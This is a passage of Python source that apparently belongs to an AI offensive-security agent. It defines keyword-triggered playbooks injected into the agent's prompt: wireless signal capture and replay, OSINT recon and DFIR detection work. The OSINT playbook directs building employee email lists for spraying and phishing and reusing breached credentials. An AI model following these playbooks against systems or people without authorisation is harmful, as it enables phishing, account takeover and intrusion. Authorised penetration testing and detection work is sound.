        "2. BLE — `bluetoothctl`/`gatttool`/`bettercap` to enumerate services and "
        "characteristics; look for unauthenticated read/write, pairing weaknesses, and "
        "replayable commands.\n"
        "3. Zigbee / sub-GHz / RFID — SDR (`gqrx`/GNU Radio, `rtl_433`) or a Proxmark/"
        "Flipper: capture, analyze, and replay the signal; test rolling-code vs fixed-code.\n"
        "PROOF = a cracked key, a captured/replayed command, or captured credentials — "
        "actually demonstrated on the in-scope radio."
    ),
)


# --- OSINT / passive recon. Keyword-driven; strictly passive. ---------------- #
_OSINT_HINT_RE = re.compile(
    r"\b(osint|footprint\w*|passive[-\s]?recon\w*|subdomain[-\s]?enum\w*|\bwhois\b|"
    r"dns[-\s]?enum\w*|shodan|censys|the[-\s]?harvester|\bamass\b|maltego|google[-\s]?"
    r"dork\w*|breach[-\s]?data|credential[-\s]?leak\w*|employee[-\s]?(email|enum)|"
    r"github[-\s]?leak\w*|dehashed|leak[-\s]?database)\b",
    re.IGNORECASE)


def _is_osint_target(state: Any, user_input: str) -> bool:
    return bool(_OSINT_HINT_RE.search(user_input or ""))


OSINT_SKILL = Skill(
    name="osint_recon",
    matches=_is_osint_target,
    body=(
        "ACTIVE PLAYBOOK — OSINT / PASSIVE reconnaissance. STRICTLY PASSIVE: gather from "
        "public/third-party sources; do NOT touch the target's systems directly (that is "
        "Recon's job). Feeds Recon, Credential, and Phishing.\n"
        "1. DOMAINS + INFRA — `whois`, DNS records, and passive subdomain enumeration "
        "(amass -passive, crt.sh certificate transparency, subfinder). Map the external "
        "footprint without scanning it.\n"
        "2. PEOPLE — enumerate employees, roles, and email format (theHarvester, "
        "LinkedIn, the site) to build a users/email list for later spraying/phishing.\n"
        "3. EXPOSURE — Shodan/Censys for exposed services/banners tied to the org; GitHub/"
        "GitLab dorking for leaked keys, configs, and internal hostnames; Google dorks "
        "(`site:`, `filetype:`) for exposed docs.\n"
        "4. BREACHES — check breach/leak datasets (HaveIBeenPwned, Dehashed) for "
        "already-compromised employee credentials to reuse.\n"
        "PROOF = the collected artifacts — the subdomain/email/employee list, a leaked "
        "credential or key, an exposed asset — handed to the active operators."
    ),
)


# --- DFIR / purple-team validation. Keyword-driven; defensive. --------------- #
_DFIR_HINT_RE = re.compile(
    r"\b(dfir|forensic\w*|incident[-\s]?response|\bioc\b|indicators?[-\s]?of[-\s]?"
    r"compromise|detection[-\s]?engineer\w*|sigma[-\s]?rules?|\byara\b|purple[-\s]?team|"
    r"memory[-\s]?forensic\w*|volatility|timeline\w*|att&?ck[-\s]?map\w*|"
    r"log[-\s]?analysis|triage[-\s]?image)\b",
    re.IGNORECASE)


def _is_dfir_target(state: Any, user_input: str) -> bool:
    return bool(_DFIR_HINT_RE.search(user_input or ""))


DFIR_SKILL = Skill(
    name="dfir_purple",
    matches=_is_dfir_target,
    body=(
        "ACTIVE PLAYBOOK — DFIR / PURPLE-TEAM validation (defensive). Turn offensive "
        "activity into detections and confirm what a defender would see. Read-only over "
        "collected evidence.\n"
        "1. TIMELINE — build a super-timeline from the evidence (log2timeline/plaso, "
        "`mactime`); order the events and pin the entry point + lateral movement.\n"
        "2. ARTIFACTS — hosts: prefetch, ShimCache/AmCache, event logs (4624/4625/4688/"
        "7045), scheduled tasks, registry run keys; memory: `volatility3` (pslist, "
        "malfind, netscan). Extract IOCs — hashes, IPs, domains, filenames, mutexes.\n"
        "3. MAP TO ATT&CK — tag each observed action with its MITRE technique; note which "
        "were logged vs invisible (the detection gaps).\n"
        "4. WRITE DETECTIONS — author Sigma rules (and YARA for the samples) for the "
        "techniques that had no coverage; validate they fire against the evidence.\n"
        "PROOF = the timeline + IOC list + the Sigma/YARA rules that detect the activity, "
        "with the attack→detection mapping."
    ),
)


# The active skill set: Mapache's baked-in offensive playbooks across domains — web,
# network service, credential, AD, cloud, binary, mobile, social engineering, smart
# contracts, supply chain, ICS/OT, IoT/firmware, wireless, OSINT, and DFIR/purple.
# User/community additions load from SKILL.md files via core/skill_format.py.
SKILLS: list[Skill] = [WEB_ATTACK_SKILL, NETWORK_ATTACK_SKILL, CREDENTIAL_ATTACK_SKILL,
                       AD_ATTACK_SKILL, CLOUD_ATTACK_SKILL, BINARY_PWN_SKILL,
                       MOBILE_ATTACK_SKILL, SOCIAL_ENGINEERING_SKILL, WEB3_ATTACK_SKILL,
                       SUPPLY_CHAIN_SKILL, ICS_ATTACK_SKILL, IOT_ATTACK_SKILL,
                       WIRELESS_ATTACK_SKILL, OSINT_SKILL, DFIR_SKILL]

# File-authored skills (SKILL.md, loaded via core/skill_format.py) register here, so
# an operator can drop a Markdown playbook into a skills/ dir and have it injected the
# same way as the built-ins — no code change. Kept separate so a reload can replace
# just the file-authored set without disturbing the built-ins.
_REGISTERED_SKILLS: list[Skill] = []


def register_skill(skill: Skill) -> None:
    """Add a skill to the injectable set (replacing any with the same name)."""
    global _REGISTERED_SKILLS
    _REGISTERED_SKILLS = [s for s in _REGISTERED_SKILLS if s.name != skill.name]
    _REGISTERED_SKILLS.append(skill)


def clear_registered_skills() -> None:
    """Drop all file-authored skills (used by a reload / by tests)."""
    _REGISTERED_SKILLS.clear()


def registered_skills() -> list[Skill]:
    return list(_REGISTERED_SKILLS)


def all_skills() -> list[Skill]:
    """Built-in skills followed by file-authored ones."""
    return SKILLS + _REGISTERED_SKILLS


def relevant_skills(state: Any, user_input: str = "") -> list[str]:
    """Bodies of the skills whose predicate matches the current state/request."""
    out: list[str] = []
    for skill in all_skills():
        try:
            if skill.matches(state, user_input):
                out.append(skill.body)
        except Exception:
            continue
    return out
